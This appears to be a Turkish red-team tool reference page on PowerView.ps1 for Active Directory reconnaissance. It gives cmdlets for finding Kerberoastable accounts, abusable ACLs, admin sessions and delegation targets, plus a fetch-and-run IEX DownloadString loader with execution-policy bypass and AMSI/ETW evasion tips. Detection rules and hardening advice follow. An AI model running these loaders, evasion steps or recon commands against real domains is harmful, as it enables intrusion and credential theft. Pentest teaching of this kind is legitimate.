# PowerView.ps1

> **Kategori:** [3. DİZİN KEŞFİ, GRAF ANALİZİ VE SALDIRI YOLU HARİTALAMA (RECON & BLOODHOUND)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Will Schroeder (@harmj0y) tarafından geliştirilen; saf Windows API, .NET `System.DirectoryServices` (ADSI) ve LDAP/RPC/SMB protokollerini kullanarak RSAT veya ActiveDirectory PowerShell modülüne ihtiyaç duymadan etki alanı keşfi, ACL analizi, oturum avcılığı (session hunting) ve güven ilişkisi haritalama sağlayan kırmızı takım keşif kütüphanesi.

---

## 1. Genel Bakış ve Amaç

**PowerView.ps1**, PowerShell tabanlı Active Directory keşif araçlarının endüstri standardı haline gelmiş en popüler ve kapsamlı kütüphanesidir. PowerSploit çatısının `Recon` modülü altında geliştirilen bu araç, sızma testi uzmanlarının ve kırmızı takımların hedef etki alanında yerel ayrıcalık elde ettikten sonra dizin mimarisini en ince ayrıntısına kadar haritalandırmasını sağlar.

PowerView'ın en büyük gücü ve mimari avantajı, Windows yönetim araçlarına (**RSAT - Remote Server Administration Tools**) veya Microsoft'un resmi `ActiveDirectory` PowerShell modülüne bağımlı **olmamasıdır**. Standart bir etki alanı kullanıcısı ayrıcalığında, arka planda doğrudan .NET Framework'ün `System.DirectoryServices.DirectorySearcher` (ADSI) sınıflarını ve Win32 API (`Netapi32.dll`) fonksiyonlarını çağırarak hedef DC ve etki alanı üyeleriyle iletişim kurar.

### Mimari Akış Şeması

```
+-----------------------------------------------------------------------------------+
|                            POWERVIEW.PS1 MİMARİSİ                                 |
+-----------------------------------------------------------------------------------+
                                          |
                        [Operatör / Bellek İçi Yükleme]
                        IEX (New-Object Net.WebClient)...
                        veya . .\PowerView.ps1 (Dot-Sourcing)
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                              PowerView Cmdlet Ailesi                              |
+-----------------------------------------------------------------------------------+
        |                                 |                                 |
        v                                 v                                 v
[Dizin Keşfi & Nesneler]        [Acl & Güvenlik Analizi]       [Oturum & Yönetici Avı]
- Get-DomainUser                - Get-DomainObjectAcl          - Invoke-UserHunter
- Get-DomainComputer            - Find-InterestingDomainAcl    - Find-LocalAdminAccess
- Get-DomainGroup               - Add-DomainObjectAcl          - Get-NetSession
- Get-DomainGPO                 - Get-DomainOU                 - Get-NetLoggedon
        |                                 |                                 |
        v                                 v                                 v
+-----------------------+       +---------------------+        +--------------------+
|  System.Directory-   |       |  Active Directory   |        |   Win32 / NetAPI   |
|   Services (ADSI)     |       |    Security (SDDL)  |        |    (Netapi32.dll)  |
+-----------------------+       +---------------------+        +--------------------+
        |                                 |                                 |
        +---------------+                 |                 +---------------+
                        |                 |                 |
                        v                 v                 v
                 [LDAP: 389/636]   [SMB / RPC: 445]   [Kerberos / DNS]
                        |                 |                 |
                        +-----------------+-----------------+
                                          |
                                          v
                +---------------------------------------------------+
                |     Domain Controller & Domain Member Systems     |
                +---------------------------------------------------+
```

### PowerView Fonksiyon Grupları

| Fonksiyon Grubu | Örnek Cmdlet'ler | Operasyonel Kullanım Alanı |
|---|---|---|
| **Etki Alanı & Orman Bilgisi** | `Get-Domain`, `Get-DomainController`, `Get-DomainTrust`, `Get-Forest` | Temel etki alanı parametreleri, DC adresleri ve forest güven sınırları. |
| **Kullanıcı & Bilgisayar Keşfi** | `Get-DomainUser`, `Get-DomainComputer`, `Get-DomainGroupMember` | SPN kaydı olan hesaplar (Kerberoast), AS-REP Roastable hesaplar, OS sürümleri. |
| **ACL & İzin Analizi** | `Get-DomainObjectAcl`, `Find-InterestingDomainAcl`, `Add-DomainObjectAcl` | GenericAll, WriteDacl, ResetPassword, DS-Replication (DCSync) izinlerinin tespiti. |
| **Oturum & Yetki Avcılığı** | `Invoke-UserHunter`, `Find-LocalAdminAccess`, `Get-NetSession` | Domain Admin'lerin hangi makinelerde oturum açtığını ve lokal admin olunan PC'leri bulma. |
| **GPO & Delegasyon Analizi** | `Get-DomainGPO`, `Get-DomainGPOLocalGroup`, `Get-DomainUser -TrustedToAuth` | Kötü yapılandırılmış grup politikaları ve Kerberos Constrained/Unconstrained Delegation. |

### Alternatif Araçlarla Karşılaştırma

| Kriter | PowerView.ps1 | SharpView.exe | AD PowerShell Modülü | BloodHound / SharpHound | AdFind.exe |
|---|---|---|---|---|---|
| **Platform / Tür** | PowerShell Script | C# Bağımsız Binary | Windows RSAT Modülü | Graf / Veritabanı | C++ CLI İkili |
| **RSAT Bağımlılığı** | Yok | Yok | **Var (RSAT Gerekir)** | Yok | Yok |
| **Boru Hattı (Pipeline)** | Mükemmel (`Select`, `Where`) | Kısıtlı | İyi | Yok | Yok |
| **AMSI / EDR Hassasiyeti** | Çok Yüksek (İmzalıdır) | Orta | Düşük | Düşük / Orta | Düşük |
| **Saldırı Yeteneği (ACL/Mod)** | Var (`Add-DomainObjectAcl`) | Sadece Keşif (View) | Kısıtlı | Yok (Salt Okunur) | Yok (Salt Okunur) |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

PowerView bir PowerShell betiği (`.ps1`) olduğu için önce mevcut PowerShell oturumuna (Runspace) yüklenmelidir.

### Belleğe Yükleme Yöntemleri

```powershell
# Yöntem 1: Yerel Diskten Dot-Sourcing ile Yükleme
. .\PowerView.ps1

# Yöntem 2: Bellek İçi (In-Memory) Uzaktan Yükleme (Diske Yazmadan)
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.50/PowerView.ps1')

# Yöntem 3: Kod İçi Doğrudan Modül Çağırma
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.50/PowerView.ps1'); Get-DomainUser -SPN"
```

### Standart Ortak Parametreler

PowerView cmdlet'lerinin büyük bölümü aşağıdaki standart parametreleri destekler:

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `-Domain` | Sorgulanacak hedef etki alanı adı (mevcut etki alanı dışını sorgulamak için). | `corp.target.local` |
| `-Server` | Belirli bir Etki Alanı Denetleyicisi (DC) adresi veya FQDN'i. | `dc01.target.local` / `10.10.10.10` |
| `-Credential` | Farklı bir kullanıcının kimlik bilgileriyle sorgu yapmak için `PSCredential` nesnesi. | `$cred = Get-Credential` |
| `-Filter` | PowerShell tabanlı sonuç filtreleme (PowerView iç filtreleme). | `"samaccountname -like '*admin*'"` |
| `-LDAPFilter` | Sunucu taraflı (DC üzerinde) çalışan LDAP arama filtresi (Çok daha hızlı ve gizli). | `"(servicePrincipalName=*)"` |
| `-Properties` | Dönen nesnelerin sadece istenen özniteliklerini (attributes) getirme. | `samaccountname,description,pwdlastset` |
| `-SearchBase` | Sorgunun başlatılacağı spesifik OU (Organizational Unit) yolu (Distinguished Name). | `"OU=Finans,DC=corp,DC=local"` |
| `-SearchScope` | LDAP arama derinliği (`Base`, `OneLevel`, `Subtree`). | `Subtree` (Varsayılan) |

> [!TIP]
> **OPSEC İpucu:** Her zaman istemci tarafı filtreleme (`| Where-Object { $_.name -like ... }`) yerine sunucu tarafı `-LDAPFilter` kullanın. İstemci tarafı filtreleme tüm dizin verisini ağ üzerinden çeker ve SIEM/NDR üzerinde ciddi gürültü yaratır.

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Kerberoasting ve AS-REP Roasting için Savunmasız Hesapları Keşfetme

Etki alanında parola özetleri çevrimdışı kırılabilecek (Kerberoasting) veya Kerberos ön kimlik doğrulaması kapatılmış (AS-REP Roasting) hesapları listeleme:

```powershell
# 1. SPN tanımlı (Kerberoastable) kullanıcıları bulma
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname, memberof

# 2. Pre-authentication zorunluluğu kaldırılmış (AS-REP Roastable) hesapları tespit etme
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, useraccountcontrol, pwdlastset

# 3. Açıklama (description) alanında parola veya şifre ipucu barındıran kullanıcılar
Get-DomainUser -LDAPFilter "(description=*pass*)" | Select-Object samaccountname, description
```

**Konsol Çıktısı Analizi:**

```text
samaccountname        serviceprincipalname                        memberof
--------------        --------------------                        --------
svc_sql_prod          MSSQLSvc/db01.corp.local:1433               {CN=SQL Admins,OU=Groups,DC=corp,DC=local}
svc_iis_app           HTTP/web.corp.local                         {CN=Domain Users,CN=Users,DC=corp,DC=local}
krbtgt_backup         krbtgt/backup                               {CN=Backup Operators,CN=Builtin,DC=corp,DC=local}
```
*Analiz: `svc_sql_prod` hesabı yüksek yetkili "SQL Admins" grubu üyesidir. Bu hesabın TGS bileti Rubeus veya Impacket ile çekilip Hashcat ile kırılarak SQL Admin yetkisi elde edilebilir.*

### Senaryo 2: Etki Alanında Hassas ACL Yetkilerini ve Arka Kapıları Bulma

Hedef nesneler üzerinde tehlikeli izinlere sahip (`GenericAll`, `WriteDacl`, `WriteOwner`, `GenericWrite`, `ExtendedRight`) nesnelerin tespiti:

```powershell
# 1. Belirli bir kullanıcı veya grup üzerindeki ilginç ACL haklarını GUID çözümlemesiyle listeleme
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner"
}

# 2. Etki alanındaki tüm şüpheli/ilginç ACL'leri otomatik filtreleyen dahili PowerView komutu
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
    $_.IdentityReferenceName -notmatch "Administrator|Domain Admins|Enterprise Admins|Enterprise Key Admins"
} | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights
```

### Senaryo 3: Etki Alanı Yöneticisi Oturumu ve Yerel Yönetici Avcılığı

Ele geçirilen hesapla hangi etki alanı makinelerinde yerel yönetici (`Local Admin`) olunduğunu ve yüksek yetkili kullanıcıların (`Domain Admins`) hangi sistemlerde aktif oturumu olduğunu bulma:

```powershell
# 1. Mevcut kullanıcı bağlamında yerel yönetici erişimi olan bilgisayarları bulma
Find-LocalAdminAccess -Verbose

# 2. Domain Admins grubundaki kullanıcıların aktif oturumlarını (SMB/RPC) haritalama
Invoke-UserHunter -CheckAccess -TargetGroupName "Domain Admins"
```

**Konsol Çıktısı Analizi:**

```text
[*] Starting user hunting with thread count 10
[+] Found DA: CORP\da_mehmet on WORKSTATION-014.corp.local (via Session)
[+] Found DA: CORP\da_ahmet on FILESVR-01.corp.local (via LoggedOn)
[+] Local admin access confirmed on: WORKSTATION-014.corp.local
```
*Analiz: `da_mehmet` kullanıcısı `WORKSTATION-014` makinesinde aktif oturum açmıştır ve operatörün mevcut hesabı aynı makinede Local Admin yetkisine sahiptir! Operatör bu makineye sıçrayıp LSASS bellek dökümü alarak doğrudan Domain Admin biletini çalabilir.*

### Senaryo 4: Kötü Yapılandırılmış GPO'lar ve Yerel Yönetici Dağıtımı

Grup Politikaları (GPO) üzerinden hangi kullanıcılara veya gruplara yerel yöneticilik verildiğini ve GPO düzenleme izinlerini bulma:

```powershell
# 1. GPO Restricted Groups üzerinden lokal admin atanan grupları listeleme
Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName, LocalGroupName

# 2. Mevcut kullanıcının değiştirebileceği (Write/GenericAll) GPO'ları tespit etme
Get-DomainObjectAcl -Identity "Policies" -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|GenericAll" -and
    $_.IdentityReferenceName -eq "Domain Users"
}
```

### Senaryo 5: Ormanlar Arası Güven İlişkileri ve Yönlerinin Tespiti

Hedef etki alanının dış etki alanları ve ormanlarla olan çift veya tek yönlü güven köprülerini dökme:

```powershell
# 1. Mevcut etki alanının tüm güven ilişkilerini getirme
Get-DomainTrust

# 2. Ormanlar arası (Forest-to-Forest) güven ilişkilerini ve SID Filtering durumunu listeleme
Get-ForestTrust
```

### Senaryo 6: Kerberos Delegasyonu (Unconstrained / Constrained) Tespiti

TGS bileti enjeksiyonu veya S4U2Self/S4U2Proxy saldırılarına açık sistemleri ve hesapları listeleme:

```powershell
# 1. Unconstrained Delegation tanımlı bilgisayarları bulma (DC'ler hariç)
Get-DomainComputer -Unconstrained | Where-Object { $_.name -notmatch "DC" } | Select-Object name, dnshostname

# 2. Constrained Delegation (S4U) tanımlı kullanıcı ve servis hesaplarını bulma
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Mesajı | Olası Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `This script contains malicious content and has been blocked by your antivirus software` | Windows Defender AMSI (Antimalware Scan Interface), PowerView'ın bilinen fonksiyon imzalarını tespit etti. | Bellek içi AMSI bypass tekniği uygulayın (`[Ref].Assembly.GetType(...)`), AMSI-patching yapın veya PowerView yerine derlenmiş `SharpView.exe` ikilisini bellekten çalıştırın. |
| `The term 'Get-DomainUser' is not recognized as the name of a cmdlet...` | Betik dot-sourcing yöntemiyle yüklenmedi (nokta ve boşluk unutuldu) veya farklı bir Runspace içinde kaldı. | Betiği yüklerken başına nokta ve boşluk koyarak çağırın: `. .\PowerView.ps1`. ExecutionPolicy için `-ExecutionPolicy Bypass` parametresini kullanın. |
| `System.DirectoryServices.DirectoryServicesCOMException: The server is not operational` | İstemci hedef Etki Alanı Denetleyicisi ile TCP 389/636 (LDAP) üzerinden iletişim kuramıyor veya DNS çözülemedi. | `nltest /dsgetdc:` veya `Resolve-DnsName` ile DC adresini doğrulayın. Komuta doğrudan IP veya FQDN belirterek `-Server 10.10.10.10` bayrağını ekleyin. |
| `Access is denied (System.UnauthorizedAccessException) in Invoke-UserHunter / NetSessionEnum` | Windows 10/11 ve Server 2016+ sürümlerinde uzaktan `NetSessionEnum` çağrısı standart kullanıcılara varsayılan olarak kısıtlanmıştır. | Oturum avcılığını SMB oturumları yerine doğrudan etki alanı denetleyicisindeki olay günlüklerini okuyarak (`-SearchForest` veya SIEM/WEF üzerinden) yapın veya yerel admin olunan makinelerde `Get-NetLoggedon` deneyin. |
| `A referral was returned from the server (System.DirectoryServices.DirectoryServicesCOMException)` | Orman veya çoklu etki alanı ortamında aranan nesne mevcut alt etki alanında değil, üst etki alanında yer alıyor. | `-Domain target.local` bayrağı ile ilgili alt/üst etki alanını net olarak belirtin veya Global Catalog (`-Server target.local:3268`) üzerinden sorgulama yapın. |
| `Cannot convert null to type... Cannot bind argument to parameter 'Identity'` | Belirtilen kullanıcı veya grup adı etki alanında mevcut değil ya da yazım hatası yapıldı. | İsimleri çift tırnak içine alın (`-Identity "Domain Admins"`). Tam sAMAccountName doğrulaması için `Get-DomainGroup -Identity "*Admin*"` gibi joker (wildcard) arama yapın. |
| `The script failed due to ConstrainedLanguage mode` | Sistem üzerinde PowerShell Constrained Language Mode (CLM) ve AppLocker / WDAC zorlaması aktif. | PowerShell oturumunu terk edip doğrudan .NET derlemesi olan `SharpView.exe` aracını `execute-assembly` (C2 üzerinden) ile çalıştırın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

PowerView operasyonel açıdan en güçlü araçlardan biri olmasına rağmen, mavi takım analistleri ve EDR'lar için en iyi bilinen saldırı araçlarının başında gelir.

### 5.1 Bırakılan İzler ve Log Kaynakları

1. **PowerShell Script Block Logging (Event ID 4104):**
   - PowerView yüklendiğinde ve `Get-DomainUser`, `Invoke-UserHunter` gibi fonksiyonlar çağrıldığında, PowerShell motoru çalıştırılan tüm kod bloklarını şifresiz olarak `Microsoft-Windows-PowerShell/Operational` günlüğüne kaydeder.
2. **PowerShell Module Logging (Event ID 4103):**
   - Cmdlet pipeline aktiviteleri ve modül parametreleri kaydedilir.
3. **Windows Security Event ID 4624 (Logon Type 3 - Network Logon):**
   - `Invoke-UserHunter` veya `Find-LocalAdminAccess` kullanıldığında, ağdaki onlarca/yüzlerce bilgisayara aynı anda SMB (445) ve RPC üzerinden Type 3 bağlantı açılır.
4. **Sysmon Event ID 1 (Process Creation):**
   - `powershell.exe -nop -exec bypass` çağrıları ve komut satırı argümanları uç nokta tespit sistemleri tarafından yakalanır.

### 5.2 Ağ, LDAP ve EDR İmzaları

- **LDAP Trafiği:** `(objectCategory=person)`, `(servicePrincipalName=*)`, `(userAccountControl:1.2.840.113556.1.4.803:=...)` gibi geniş kapsamlı ve ardışık filtreler DC tarafındaki LDAP trafik monitörlerinde anomali üretir.
- **RPC / SMB Gürültüsü:** `NetSessionEnum` ve `NetWkstaUserEnum` API çağrıları ağ üzerinde IDS/IPS (Suricata/Snort) kurallarını tetikler.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | PowerView Karşılığı |
|---|---|---|
| **T1087.002** | Account Discovery: Domain Account | `Get-DomainUser`, `Get-DomainUser -SPN`, `Get-DomainUser -PreauthNotRequired` |
| **T1069.002** | Permission Groups Discovery: Domain Groups | `Get-DomainGroup`, `Get-DomainGroupMember` |
| **T1482** | Domain Trust Discovery | `Get-DomainTrust`, `Get-ForestTrust` |
| **T1018** | Remote System Discovery | `Get-DomainComputer`, `Find-LocalAdminAccess` |
| **T1033** | System Owner/User Discovery | `Invoke-UserHunter`, `Get-NetSession`, `Get-NetLoggedon` |
| **T1484.001** | Domain Policy Modification: Group Policy Modification | `Get-DomainGPO`, `Get-DomainGPOLocalGroup` |
| **T1078.002** | Valid Accounts: Domain Accounts | Çalınan kimlik bilgileriyle `-Credential` üzerinden keşif yapma |

### 5.4 OPSEC Önerileri

| Risk | Tespit Sebebi | OPSEC Önlemi |
|---|---|---|
| **AMSI Bloklaması** | Bilinen string ve fonksiyon imzaları (`harmj0y`, `Get-DomainUser`). | Kodları `Invoke-Obfuscation` ile karıştırın veya doğrudan `SharpView.exe` C# ikilisine geçin. |
| **Script Block Log (4104)** | EDR ve SIEM PowerShell kod bloklarını yakalar. | Bellek içi AMSI/ETW yamalama uygulayın ya da unmanaged PowerShell / C# runner kullanın. |
| **Aşırı SMB / RPC Trafiği** | `Invoke-UserHunter` ile yüzlerce host'a aynı anda port 445 yoklaması. | Ağ genelinde oturum avcılığı yapmayın; sadece kritik birkaç sunucuyu hedefleyin (`-ComputerName filesvr01`). |
| **Geniş LDAP Sorguları** | Tüm etki alanı kullanıcılarının tek seferde çekilmesi. | Spesifik LDAP filtreleri (`-LDAPFilter`) ve `-Properties` ile yalnızca ihtiyaç duyulan alanları isteyin. |

### 5.5 Savunma Karşılığı (Blue Team & Detection)

PowerView aktivitelerini tespit eden örnek Sigma kuralı:

```yaml
title: Suspicious PowerView Cmdlet Execution
id: 593a28c4-c2c5-4d7a-8f78-powerview4104
status: experimental
description: Detects execution of well-known PowerView reconnaissance cmdlets via Script Block Logging.
logsource:
    product: windows
    service: powershell
detection:
    selection:
        ScriptBlockText|contains:
            - 'Get-DomainUser'
            - 'Get-DomainComputer'
            - 'Get-DomainObjectAcl'
            - 'Find-LocalAdminAccess'
            - 'Invoke-UserHunter'
            - 'Find-InterestingDomainAcl'
    condition: selection
falsepositives:
    - Highly unusual administrative scripts; standard sysadmins use ActiveDirectory module.
level: high
```

Sertleştirme önlemleri:
1. **PowerShell CLM (Constrained Language Mode):** Standart kullanıcılarda PowerShell'i CLM moduna alarak .NET nesnesi oluşturulmasını engelleyin.
2. **NetSessionEnum Kısıtlaması:** Windows kayıt defterinde `Netdfs` ve `Srvsvc` izinlerini yapılandırarak standart kullanıcıların SMB oturumlarını görmesini engelleyin.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```powershell
# 1. Kerberoasting için Savunmasız Hesapları Çıkarma
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
```
- **Ne Yapar?** Hizmet Temel Adı (SPN) kayıtlı tüm etki alanı kullanıcılarını listeler.
- **Ne Zaman Kullanılır?** Çevrimdışı parola kırma saldırısı (Kerberoasting) için hedef listesi hazırlarken.
- **Parametreler:** `-SPN` yalnızca SPN özniteliği dolu hesapları filtreler.

```powershell
# 2. AS-REP Roasting için Pre-Auth Kapalı Hesapları Bulma
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, useraccountcontrol
```
- **Ne Yapar?** Kerberos ön kimlik doğrulaması gerektirmeyen (DONT_REQ_PREAUTH) hesapları bulur.
- **Ne Zaman Kullanılır?** Parolaya ihtiyaç duymadan AS-REP bilet özeti elde etmek istendiğinde.
- **Parametreler:** `-PreauthNotRequired` UAC bayrağını sorgular.

```powershell
# 3. Mevcut Kullanıcının Yerel Yönetici Olduğu Bilgisayarları Keşfetme
Find-LocalAdminAccess
```
- **Ne Yapar?** Ağdaki tüm bilgisayarlara bağlanarak mevcut kullanıcının lokal admin yetkisi olanları listeler.
- **Ne Zaman Kullanılır?** Yatay hareket (lateral movement) için güvenli sıçrama tahtası ararken.
- **Parametreler:** Parametresiz çalıştırıldığında etki alanındaki tüm aktif bilgisayarları yoklar.

```powershell
# 4. Domain Admin Oturumlarını Haritalama (User Hunting)
Invoke-UserHunter -CheckAccess
```
- **Ne Yapar?** Yüksek yetkili etki alanı yöneticilerinin hangi iş istasyonlarında aktif oturum açtığını tespit eder.
- **Ne Zaman Kullanılır?** Kimlik bilgisi çalma (credential dumping) için hangi makineye sızılması gerektiğini belirlerken.
- **Parametreler:** `-CheckAccess` oturum bulunan makinede lokal admin yetkinizin olup olmadığını da doğrular.

```powershell
# 5. Domain Admins Üzerindeki Tehlikeli ACL Yetkilerini Listeleme
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl" }
```
- **Ne Yapar?** "Domain Admins" grubu üzerinde tam denetim veya izin yazma hakkı olan nesneleri döker.
- **Ne Zaman Kullanılır?** Yetki yükseltme (privilege escalation) saldırı yolu ararken.
- **Parametreler:** `-Identity` hedef nesne; `-ResolveGUIDs` hakları insan okunabilir metne dönüştürür.

```powershell
# 6. DCSync Saldırısına Açık Yetkili Hesapları Bulma
Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs | Where-Object { $_.ObjectAceType -match "Replication-Get" }
```
- **Ne Yapar?** Etki alanı kökü üzerinde dizin çoğaltma (DCSync) iznine sahip hesapları gösterir.
- **Ne Zaman Kullanılır?** Bir kullanıcının NTDS.dit dökümü alma yetkisi olup olmadığını incelerken.
- **Parametreler:** `-Identity` etki alanı ayırt edici adı (DN).

```powershell
# 7. Unconstrained Delegation Sahibi Bilgisayarları Bulma
Get-DomainComputer -Unconstrained | Select-Object samaccountname, dnshostname
```
- **Ne Yapar?** Kısıtlamasız delegasyon yetkisi olan (TGT biletlerini belleğe kaydeden) sunucuları listeler.
- **Ne Zaman Kullanılır?** SpoolSample / PetitPotam zorlamalı kimlik doğrulama ile DC bileti yakalama senaryolarında.
- **Parametreler:** `-Unconstrained` TRUSTED_FOR_DELEGATION bayrağını arar.

```powershell
# 8. Belirli Bir Açıklamaya Sahip Kullanıcıları Sunucu Taraflı Arama
Get-DomainUser -LDAPFilter "(description=*password*)" | Select-Object samaccountname, description
```
- **Ne Yapar?** Açıklama satırında açık metin parola veya parola notu unutulmuş hesapları arar.
- **Ne Zaman Kullanılır?** İlk erişim sonrası düşük gürültülü ve hızlı bilgi toplama aşamasında.
- **Parametreler:** `-LDAPFilter` sunucu taraflı filtredir, istemciye sadece eşleşen nesneler gelir.

---

## Kaynaklar

- **Resmi GitHub Reposu (PowerSploit/Recon):** [PowerShellMafia / PowerSploit - PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
- **HarmJ0y Blog Yazıları ve Dokümantasyon:** [harmj0y.net / PowerView 3.0 Tricks](https://blog.harmj0y.net/)
- **BloodHound & PowerView Entegrasyonu:** [SpectreOps Attack Research](https://posts.specterops.io/)
- **MITRE ATT&CK Framework:** [Discovery Tactic (TA0007)](https://attack.mitre.org/tactics/TA0007/)

---

> **Önceki:** [← AzureHound](./AzureHound.md) · **Sonraki:** [SharpView →](./SharpView.md)
